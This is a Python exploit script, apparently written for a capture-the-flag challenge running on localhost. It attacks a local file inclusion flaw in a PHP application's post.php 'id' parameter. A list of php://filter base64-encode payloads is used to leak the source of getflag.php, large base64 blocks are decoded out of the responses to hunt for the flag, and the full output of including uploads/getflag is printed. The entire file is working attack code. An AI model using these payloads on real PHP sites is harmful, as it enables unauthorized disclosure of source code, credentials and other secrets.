import requests
import base64

base_url = "http://127.0.0.1:32891"

print("[+] Attempting to read getflag.php source using PHP filters...")

# Use PHP filter to read the source without executing
filter_payloads = [
    # Base64 encode the source
    "php://filter/convert.base64-encode/resource=posts/uploads/getflag.php",
    "php://filter/convert.base64-encode/resource=posts/uploads/getflag",
    
    # Try without posts prefix (from LFI context)
    "php://filter/convert.base64-encode/resource=uploads/getflag.php",
    "php://filter/convert.base64-encode/resource=uploads/getflag",
]

for payload in filter_payloads:
    print(f"\n[+] Testing: {payload}")
    resp = requests.get(f"{base_url}/post.php", params={'id': payload})
    
    if resp.status_code == 200 and len(resp.text) > 100:
        print(f"Length: {len(resp.text)}")
        
        # Try to find base64 content
        import re
        
        # Look for large base64 blocks
        b64_pattern = r'[A-Za-z0-9+/]{100,}={0,2}'
        matches = re.findall(b64_pattern, resp.text)
        
        if matches:
            print(f"Found {len(matches)} base64 blocks")
            for i, match in enumerate(matches[:5]):
                try:
                    decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
                    if '<?php' in decoded or 'FLAG' in decoded or 'flag' in decoded.lower():
                        print(f"\n[!!!] Decoded PHP source (block {i+1}):")
                        print(decoded)
                        print("="*80)
                except Exception as e:
                    pass

# Also try to just see what INCLUDING via LFI gives us again, but look more carefully
print("\n[+] Re-checking uploads/getflag inclusion - looking for all content...")
resp = requests.get(f"{base_url}/post.php", params={'id': 'uploads/getflag'})

# Print FULL response to look for hidden flags
print(f"\nFULL RESPONSE from uploads/getflag inclusion:")
print(resp.text)

